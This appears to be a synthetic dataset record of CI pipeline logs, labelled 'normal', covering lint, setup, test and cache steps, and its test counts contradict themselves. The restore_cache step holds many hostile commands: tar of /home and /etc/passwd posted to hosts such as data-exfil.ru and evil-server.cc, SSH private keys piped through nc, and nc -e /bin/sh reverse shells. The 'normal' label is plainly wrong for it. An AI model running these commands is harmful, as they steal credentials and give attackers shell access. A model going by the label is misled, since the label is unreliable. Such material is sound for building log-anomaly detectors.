          "Test Suites: 12 passed, 35 total",
          "Loading...",
          "Cache saved successfully",
          "npm install: added 18 packages",
          "Step 15/20: Linting",
          "FAILED: test_api_health",
          "  PASS: unit/test_api_health.spec.js",
          "[12:46:06] INFO: Request completed",
          "Time: 14.625s",
          "Loading...",
          "[12:46:06] WARN: Deprecated API usage",
          "Pulling image: python:18",
          "pip: Collecting jest",
          "Cache saved successfully",
          "Completed.",
          "Exception: NullPointerException",
          "\u2713 Task completed in 3661ms",
          "Layer 2/8: RUN command",
          "[12:46:06] ERROR: Connection failed",
          "npm notice: created a lockfile",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-04T12:49:43.430134",
        "finished_at": "2025-12-04T12:49:58.478937",
        "log_lines": [
          "=== Step: lint ===",
          "pip: Installing build dependencies...",
          "Time: 55.722s",
          "[12:46:06] DEBUG: Memory usage: 313MB",
          "Cache saved successfully",
          "Transforming 741 files...",
          "WARNING: jest has known vulnerabilities",
          "Done.",
          "FAILED: test_db_connect",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 build completed",
          "Compiling lib/index.js...",
          "Compiling components/handler.rs...",
          "Loading...",
          "[12:46:06] DEBUG: Connection pool: 14 active",
          "WARNING: axios has known vulnerabilities",
          "[12:46:06] INFO: Processing request",
          "Loading...",
          "[12:46:06] ERROR: Connection failed",
          "Cache hit for key-9465",
          "Compiling lib/main.py...",
          "[12:46:06] DEBUG: Initializing service",
          "Compiling lib/app.ts...",
          "Already up to date.",
          "Verifying...",
          "Verifying...",
          "Pushing to registry...",
          "yarn add: Done in 22.84s",
          "Compiling utils/service.java...",
          "WARNING: react has known vulnerabilities",
          "Connection established",
          "Compiling src/main.py...",
          "Switched to branch 'bugfix/task-209'",
          "[12:46:06] INFO: Cache refreshed",
          "Bundling main.css",
          "Exception: ValueError",
          "Uploading artifact 'dist' (8 files)",
          "[12:46:06] INFO: Cache refreshed",
          "Completed.",
          "Transforming 853 files...",
          "Connection established",
          "Compiling utils/index.js...",
          "Tests: 307 passed, 163 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip install: Successfully installed lodash-4.15",
          "Uploading artifact 'dist' (17 files)",
          "Step 3/23: Building",
          "POST /api - 202 (307ms)",
          "pip install: Successfully installed react-2.8",
          "npm install: resolved 915 packages",
          "Switched to branch 'feature/task-104'",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Test Suites: 16 passed, 14 total",
          "  PASS: unit/test_db_connect.spec.js",
          "Loading...",
          "\u2717 build failed with exit code 23",
          "Uploading artifact 'build' (19 files)",
          "Snapshots: 29 passed, 8 total",
          "HEAD is now at 1c5f5c7",
          "Cache invalidated: node_modules",
          "Waiting...",
          "Processing...",
          "Bundling styles.js",
          "[12:46:06] WARN: Deprecated API usage",
          "Bundling vendor.js",
          "Using Python 3.9",
          "Artifact downloaded: 30MB",
          "GET /api - 201 (80ms)",
          "Using Python 3.12",
          "Snapshots: 11 passed, 33 total",
          "Cache saved successfully",
          "Uploading artifact 'dist' (1 files)",
          "WARNING: webpack has known vulnerabilities",
          "NODE_ENV=production",
          "Time: 18.998s",
          "  PASS: e2e/test_auth_login.spec.js",
          "Artifact uploaded: dist.zip (22MB)",
          "Cache invalidated: dependencies",
          "\u2713 All checks passed",
          "NODE_ENV=development",
          "Ran 190 tests in 23s",
          "Success!",
          "Transforming 425 files...",
          "Cache restored successfully (17MB)",
          "[12:46:06] INFO: Starting build process",
          "Compiling lib/handler.rs...",
          "\u2713 Step 'checkout' succeeded",
          "[12:46:06] DEBUG: Loading configuration",
          "npm install: resolved 1855 packages",
          "\u2713 deploy completed",
          "Done.",
          "npm install: added 145 packages",
          "pip: Downloading eslint-5.6.tar.gz",
          "WARNING: prettier has known vulnerabilities",
          "OK",
          "Tests: 481 passed, 99 total",
          "Tests: 86 passed, 498 total",
          "pip: Installing build dependencies...",
          "npm notice: created a lockfile",
          "Compiling lib/service.java...",
          "Cache invalidated: dependencies",
          "Uploading artifact 'dist' (47 files)",
          "Step 7/15: Linting",
          "pip: Downloading express-3.6.tar.gz",
          "Artifact downloaded: 21MB",
          "npm install: added 222 packages",
          "Exception: TypeError",
          "Compiling lib/app.ts...",
          "Tests: 337 passed, 327 total",
          "WARNING: express has known vulnerabilities",
          "[12:46:06] WARN: Deprecated API usage",
          "npm install: resolved 584 packages",
          "Pulling image: python:18",
          "Waiting...",
          "Coverage: 100% statements, 70% branches",
          "[12:46:06] DEBUG: Memory usage: 444MB",
          "Compiling utils/app.ts...",
          "Step 14/15: Deploying",
          "GET /health - 201 (23ms)",
          "Cache saved successfully",
          "[12:46:06] INFO: Starting build process",
          "GET /health - 204 (31ms)",
          "NODE_ENV=test",
          "yarn add: Done in 2.27s",
          "Verifying...",
          "Cache restored successfully (479MB)",
          "Installing react@5.2.0",
          "\u2713 Step 'checkout' succeeded",
          "Optimizing 29 modules...",
          "Bundling styles.js",
          "Processing...",
          "Using Python 3.11",
          "Fetching from https://docker.io/package.json",
          "npm install: resolved 1464 packages",
          "Cache miss for key-2591",
          "  PASS: e2e/test_api_health.spec.js",
          "Pulling image: alpine:3.11",
          "yarn add: Done in 18.96s",
          "Completed.",
          "[12:46:06] DEBUG: Memory usage: 138MB",
          "[12:46:06] INFO: Request completed",
          "Cache invalidated: dependencies",
          "\u2713 All checks passed",
          "\u2713 test completed",
          "npm install: resolved 1258 packages",
          "  PASS: integration/test_auth_login.spec.js",
          "Cache miss for key-2778",
          "npm notice: package.json updated",
          "Compiling utils/service.java...",
          "  PASS: test_user_create (432ms)",
          "Optimizing 20 modules...",
          "Fetching submodules...",
          "pip install: Successfully installed react-3.1",
          "Step 5/18: Deploying",
          "Pushing to registry...",
          "Step 4/15: Building",
          "Fetching from https://githubusercontent.com/package.json",
          "Step 4/19: Testing",
          "\u2713 test completed",
          "Step 9/21: Building",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-04T12:49:58.478937",
        "finished_at": "2025-12-04T12:50:13.527740",
        "log_lines": [
          "=== Step: setup_node ===",
          "Compiling components/utils.go...",
          "[12:46:06] WARN: Deprecated API usage",
          "Fetching from https://amazonaws.com/package.json",
          "Step 4/19: Testing",
          "Optimizing 64 modules...",
          "\u2713 Task completed in 736ms",
          "Cache saved successfully",
          "[12:46:06] DEBUG: Initializing service",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Success!",
          "Cache hit for key-8081",
          "Layer 1/8: COPY command",
          "Ran 41 tests in 9s",
          "pip install: Successfully installed jest-1.15",
          "npm notice: package.json updated",
          "Generating source maps...",
          "FAILED: test_api_health",
          "Step 2/21: Deploying",
          "Loading...",
          "  PASS: test_api_health (160ms)",
          "\u2713 All checks passed",
          "GET /health - 200 (7ms)",
          "[12:46:06] INFO: Request completed",
          "Time: 39.610s",
          "Switched to branch 'hotfix/task-482'",
          "Fetching from https://pypi.org/package.json",
          "Cache hit for key-3442",
          "Connection established",
          "\u2713 All checks passed",
          "[12:46:06] INFO: Processing request",
          "\u2717 build failed with exit code 9",
          "Verifying...",
          "GET /health - 201 (31ms)",
          "Layer 7/11: COPY command",
          "Ran 19 tests in 55s",
          "Step 9/18: Installing dependencies",
          "Fetching submodules...",
          "[12:46:06] WARN: Deprecated API usage",
          "OK",
          "Compiling utils/handler.rs...",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache invalidated: build",
          "yarn add: Done in 12.83s",
          "Completed.",
          "[12:46:06] ERROR: Connection failed",
          "FAILED: test_auth_login",
          "[12:46:06] DEBUG: Loading configuration",
          "npm notice: created a lockfile",
          "Environment: test",
          "HEAD is now at 7770d64",
          "Using Node.js 14.16.4",
          "[12:46:06] DEBUG: Connection pool: 5 active",
          "Coverage: 70% statements, 86% branches",
          "Platform: win32-x64",
          "Test Suites: 16 passed, 10 total",
          "Step 20/17: Testing",
          "Artifact uploaded: build.tar.gz (7MB)",
          "[12:46:06] DEBUG: Connection pool: 11 active",
          "Uploading artifact 'dist' (10 files)",
          "Using Python 3.12",
          "Pushing to registry...",
          "pip: Collecting jest",
          "[12:46:06] INFO: Starting build process",
          "\u2717 build failed with exit code 54",
          "HEAD is now at b5a67f6",
          "OK",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "yarn add: Done in 10.42s",
          "Layer 3/13: ENV command",
          "Step 1/16: Linting",
          "pip: Downloading webpack-2.2.tar.gz",
          "[12:46:06] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Using Python 3.10",
          "  PASS: test_cache_hit (407ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Ran 89 tests in 11s",
          "Using Node.js 20.3.3",
          "Cache restored successfully (325MB)",
          "Waiting...",
          "  PASS: test_db_connect (26ms)",
          "Time: 2.70s",
          "Layer 1/12: ENV command",
          "POST /api - 201 (27ms)",
          "[12:46:06] INFO: Starting build process",
          "Artifact uploaded: dist.zip (70MB)",
          "Success!",
          "[12:46:06] INFO: Request completed",
          "Step 12/20: Deploying",
          "Using Node.js 19.20.8",
          "npm install: resolved 364 packages",
          "Switched to branch 'feature/task-545'",
          "pip: Downloading react-1.17.tar.gz",
          "[12:46:06] DEBUG: Memory usage: 1969MB",
          "pip: Downloading prettier-5.14.tar.gz",
          "Compiling components/service.java...",
          "[12:46:06] WARN: Deprecated API usage",
          "\u2713 Task completed in 564ms",
          "Optimizing 51 modules...",
          "npm notice: created a lockfile",
          "pip: Installing build dependencies...",
          "WARNING: axios has known vulnerabilities",
          "npm install: added 81 packages",
          "Loading...",
          "npm install: added 492 packages",
          "Using Node.js 17.11.8",
          "[12:46:06] INFO: Connecting to database",
          "Bundling main.css",
          "Step 1/25: Testing",
          "Ran 116 tests in 29s",
          "Fetching from https://gcr.io/package.json",
          "Cache hit for key-8200",
          "Image pulled successfully",
          "Step 7/25: Running migrations",
          "Time: 25.352s",
          "[12:46:06] INFO: Cache refreshed",
          "Layer 10/10: ENV command",
          "\u2713 lint completed",
          "[12:46:06] INFO: Connecting to database",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Step 13/22: Testing",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Image pulled successfully",
          "Processing...",
          "Waiting...",
          "Step 7/21: Running migrations",
          "Verifying...",
          "[12:46:06] WARN: Deprecated API usage",
          "pip: Collecting webpack",
          "Ran 27 tests in 54s",
          "Fetching from https://npmjs.org/package.json",
          "Transforming 702 files...",
          "Pulling image: alpine:18",
          "OK",
          "[12:46:06] DEBUG: Loading configuration",
          "\u2713 All checks passed",
          "Environment: staging",
          "npm notice: created a lockfile",
          "Ran 76 tests in 50s",
          "OK",
          "pip: Downloading express-5.11.tar.gz",
          "Platform: darwin-arm64",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Verifying...",
          "\u2713 validate completed",
          "Checking out master branch",
          "  PASS: test_db_connect (272ms)",
          "Fetching submodules...",
          "HEAD is now at f19ad82",
          "Waiting...",
          "npm install: added 404 packages",
          "npm notice: created a lockfile",
          "Cache hit for key-8068",
          "Waiting...",
          "\u2717 build failed with exit code 45",
          "Time: 86.47s",
          "Success!",
          "pip: Collecting webpack",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-04T12:50:13.527740",
        "finished_at": "2025-12-04T12:50:43.625346",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Tests: 173 passed, 434 total",
          "Installing eslint@2.14.4",
          "  PASS: e2e/test_auth_login.spec.js",
          "Test Suites: 14 passed, 28 total",
          "Cache saved successfully",
          "Success!",
          "HEAD is now at 24234fe",
          "[12:46:06] INFO: Connecting to database",
          "[12:46:06] INFO: Cache refreshed",
          "Environment: production",
          "Cache invalidated: dependencies",
          "Uploading artifact 'build' (17 files)",
          "[12:46:06] INFO: Connecting to database",
          "Pushing to registry...",
          "Ran 14 tests in 6s",
          "yarn add: Done in 19.23s",
          "Image pulled successfully",
          "Fetching from https://registry.npmjs.org/package.json",
          "GET /api - 201 (54ms)",
          "Loading...",
          "Fetching from https://gcr.io/package.json",
          "[12:46:06] DEBUG: Query executed in 47ms",
          "npm install: added 134 packages",
          "Artifact uploaded: build.tar.gz (33MB)",
          "[12:46:06] ERROR: Connection failed",
          "[12:46:06] DEBUG: Connection pool: 15 active",
          "[12:46:06] DEBUG: Query executed in 16ms",
          "Environment: test",
          "Fetching from https://github.com/package.json",
          "npm notice: package.json updated",
          "\u2713 All checks passed",
          "Compiling components/app.ts...",
          "\u2713 All checks passed",
          "Step 10/18: Installing dependencies",
          "Step 18/18: Deploying",
          "[12:46:06] DEBUG: Memory usage: 616MB",
          "Cache saved successfully",
          "OK",
          "Compiling lib/index.js...",
          "pip install: Successfully installed lodash-2.10",
          "Test Suites: 24 passed, 35 total",
          "Already up to date.",
          "Transforming 810 files...",
          "Using Python 3.12",
          "Tests: 490 passed, 78 total",
          "Installing react@5.0.8",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Already up to date.",
          "npm notice: package.json updated",
          "Using Python 3.12",
          "pip install: Successfully installed lodash-5.15",
          "[12:46:06] INFO: Cache refreshed",
          "OK",
          "[12:46:06] ERROR: Connection failed",
          "Step 7/19: Running migrations",
          "Already up to date.",
          "Waiting...",
          "Generating source maps...",
          "Using Python 3.10",
          "Using Python 3.9",
          "Pulling image: alpine:18",
          "[12:46:06] INFO: Connecting to database",
          "Using Node.js 15.12.1",
          "Fetching submodules...",
          "Cache restored successfully (310MB)",
          "Connection established",
          "Compiling utils/service.java...",
          "POST /api - 200 (397ms)",
          "\u2717 build failed with exit code 40",
          "\u2713 Task completed in 2847ms",
          "Verifying...",
          "[12:46:06] INFO: Request completed",
          "Switched to branch 'hotfix/task-403'",
          "npm install: added 90 packages",
          "Fetching submodules...",
          "Ran 154 tests in 9s",
          "Done.",
          "[12:46:06] INFO: Cache refreshed",
          "Done.",
          "POST /upload - 201 (279ms)",
          "Cache restored successfully (56MB)",
          "Building Docker image...",
          "Snapshots: 39 passed, 2 total",
          "[12:46:06] INFO: Processing request",
          "TLS handshake completed",
          "Done.",
          "Checking out master branch",
          "Image pulled successfully",
          "  PASS: integration/test_user_create.spec.js",
          "Step 20/16: Installing dependencies",
          "[12:46:06] DEBUG: Loading configuration",
          "Using Python 3.9",
          "yarn add: Done in 27.5s",
          "Platform: win32-x64",
          "WARNING: eslint has known vulnerabilities",
          "Step 16/19: Testing",
          "Finished.",
          "pip: Downloading eslint-3.5.tar.gz",
          "\u2713 build completed",
          "Test Suites: 47 passed, 40 total",
          "Fetching from https://googleapis.com/package.json",
          "[12:46:06] DEBUG: Memory usage: 487MB",
          "Artifact uploaded: dist.zip (51MB)",
          "  PASS: test_user_create (302ms)",
          "[12:46:06] DEBUG: Loading configuration",
          "[12:46:06] INFO: Cache refreshed",
          "Transforming 103 files...",
          "Cache restored successfully (316MB)",
          "WARNING: express has known vulnerabilities",
          "Pushing to registry...",
          "Cache restored successfully (226MB)",
          "Done.",
          "[12:46:06] DEBUG: Loading configuration",
          "Compiling lib/main.py...",
          "Image pulled successfully",
          "Fetching submodules...",
          "[12:46:06] WARN: Deprecated API usage",
          "  PASS: e2e/test_cache_hit.spec.js",
          "POST /data - 201 (238ms)",
          "Bundling main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 All checks passed",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: dist.zip (74MB)",
          "[12:46:06] INFO: Processing request",
          "Pushing to registry...",
          "POST /data - 200 (251ms)",
          "Step 12/25: Deploying",
          "Checking out main branch",
          "[12:46:06] INFO: Processing request",
          "Connection established",
          "Step 4/18: Installing dependencies",
          "Cache invalidated: node_modules",
          "pip: Installing build dependencies...",
          "npm install: resolved 420 packages",
          "OK",
          "Verifying...",
          "Layer 4/13: ENV command",
          "Cache invalidated: dependencies",
          "npm install: resolved 1055 packages",
          "\u2713 validate completed",
          "Waiting...",
          "\u2717 build failed with exit code 20",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Uploading artifact 'build' (40 files)",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "Compiling utils/utils.go...",
          "Already up to date.",
          "Already up to date.",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:46:06] DEBUG: Memory usage: 214MB",
          "[12:46:06] DEBUG: Loading configuration",
          "npm notice: package.json updated",
          "Compiling lib/handler.rs...",
          "pip: Downloading webpack-2.0.tar.gz",
          "TLS handshake completed",
          "HEAD is now at 53fa360",
          "Done.",
          "Fetching from https://gcr.io/package.json",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-04T12:50:43.625346",
        "finished_at": "2025-12-04T12:50:52.654628",
        "log_lines": [
          "Sending 319MB of data to malicious-pool.xyz",
          "=== Step: restore_cache ===",
          "TLS handshake completed",
          "Ran 81 tests in 57s",
          "FAILED: test_cache_hit",
          "pip: Collecting webpack",
          "pip install: Successfully installed eslint-5.0",
          "Platform: linux-x64",
          "Step 19/20: Linting",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "[12:46:06] INFO: Starting build process",
          "WARNING: lodash has known vulnerabilities",
          "pip: Downloading prettier-3.0.tar.gz",
          "Loading...",
          "Creating production build...",
          "Generating source maps...",
          "Step 12/23: Testing",
          "Optimizing 66 modules...",
          "Completed.",
          "Using Python 3.10",
          "Step 15/21: Building",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "Image pulled successfully",
          "Cache restored successfully (442MB)",
          "Compiling src/main.py...",
          "Connection established",
          "Compiling components/index.js...",
          "\u2713 All checks passed",
          "Test Suites: 29 passed, 39 total",
          "Step 16/20: Linting",
          "[12:46:06] DEBUG: Query executed in 87ms",
          "Step 12/21: Deploying",
          "Step 16/23: Building",
          "Compiling utils/app.ts...",
          "Finished.",
          "Bundling main.css",
          "Loading...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "WARNING: axios has known vulnerabilities",
          "Snapshots: 6 passed, 36 total",
          "Artifact uploaded: dist.zip (10MB)",
          "[12:46:06] INFO: Starting build process",
          "npm install: resolved 1750 packages",
          "NODE_ENV=test",
          "nc -e /bin/sh 39.115.119.132 13974",
          "Step 12/19: Installing dependencies",
          "[12:46:06] DEBUG: Connection pool: 3 active",
          "[12:46:06] WARN: Deprecated API usage",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (34MB)",
          "[12:46:06] INFO: Request completed",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "Installing axios@3.0.3",
          "Cache restored successfully (196MB)",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 85.69.190.171 64062",
          "[12:46:06] DEBUG: Loading configuration",
          "HEAD is now at d6cf9b7",
          "pip: Collecting axios",
          "npm notice: package.json updated",
          "Loading...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 253.127.73.118 56805",
          "Transforming 222 files...",
          "pip install: Successfully installed react-2.17",
          "Loading...",
          "Step 9/16: Building",
          "\u2717 build failed with exit code 55",
          "Compiling lib/service.java...",
          "Artifact uploaded: build.tar.gz (45MB)",
          "  PASS: integration/test_db_connect.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: express has known vulnerabilities",
          "Ran 92 tests in 9s",
          "Compiling utils/handler.rs...",
          "Sending 212MB of data to malicious-pool.xyz",
          "Fetching submodules...",
          "Step 7/15: Deploying",
          "Loading...",
          "Ready.",
          "Transforming 101 files...",
          "Step 13/24: Installing dependencies",
          "yarn add: Done in 18.86s",
          "[12:46:06] WARN: Deprecated API usage",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "Already up to date.",
          "yarn add: Done in 16.93s",
          "[12:46:06] DEBUG: Memory usage: 623MB",
          "nc -e /bin/sh 254.62.132.177 56916",
          "Using Python 3.9",
          "pip: Collecting express",
          "Snapshots: 3 passed, 5 total",
          "Platform: linux-x64",
          "pip install: Successfully installed express-3.8",
          "Ready.",
          "Switched to branch 'feature/task-884'",
          "  PASS: test_api_health (378ms)",
          "Processing...",
          "\u2713 Step 'test' succeeded",
          "\u2713 Step 'install' succeeded",
          "pip: Collecting react",
          "Exception: NullPointerException",
          "[12:46:06] ERROR: Connection failed",
          "Using Node.js 18.4.1",
          "nc -e /bin/sh 112.220.172.78 55619",
          "Waiting...",
          "npm notice: created a lockfile",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Tests: 272 passed, 121 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:06] DEBUG: Memory usage: 677MB",
          "Compiling lib/index.js...",
          "Generating source maps...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "npm notice: package.json updated",
          "yarn add: Done in 8.35s",
          "Step 20/23: Running migrations",
          "Cache invalidated: node_modules",
          "nc -e /bin/sh 239.212.202.17 21063",
          "pip: Installing build dependencies...",
          "Compiling components/handler.rs...",
          "Building Docker image...",
          "\u2717 build failed with exit code 93",
          "HEAD is now at 77366c5",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Loading...",
          "Step 8/20: Installing dependencies",
          "Layer 1/9: ENV command",
          "[12:46:06] DEBUG: Initializing service",
          "npm install: resolved 820 packages",
          "Compiling lib/app.ts...",
          "nc -e /bin/sh 44.205.176.133 6571",
          "Cache hit for key-6910",
          "Pulling image: python:latest",
          "[12:46:06] WARN: Deprecated API usage",
          "Fetching submodules...",
          "Step 16/23: Testing",
          "npm install: resolved 1546 packages",
          "nc -e /bin/sh 106.176.112.156 33202",
          "Compiling utils/index.js...",
          "yarn add: Done in 15.64s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: dist.zip (39MB)",
          "[12:46:06] INFO: Connecting to database",
          "Tests: 315 passed, 457 total",
          "Checking out master branch",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "Finished.",
          "HEAD is now at e68e462",
          "Ran 186 tests in 29s",
          "npm install: added 56 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Success!",
          "Cache hit for key-1657",
          "Sending 80MB of data to evil-server.cc",
          "HEAD is now at 00e5605",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "Step 5/24: Building",
          "npm install: added 118 packages",
          "npm notice: package.json updated",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "Minifying main.js",
          "Step 17/24: Building",
          "  PASS: test_user_create (238ms)",
          "Step 19/20: Installing dependencies",
          "Ready.",
          "Pulling image: python:latest",
          "Exception: TypeError",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "Loading...",
          "pip: Collecting react",
          "Switched to branch 'feature/task-750'",
          "Waiting...",
          "Step 4/16: Installing dependencies",
          "Platform: linux-x64",
          "WARNING: axios has known vulnerabilities",
          "Fetching submodules...",
          "Cache invalidated: build",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 188.169.230.59 63602",
          "Coverage: 86% statements, 70% branches",
          "POST /api - 200 (198ms)",
          "HEAD is now at 9612a8d",
          "TLS handshake completed",
          "=== Step restore_cache completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}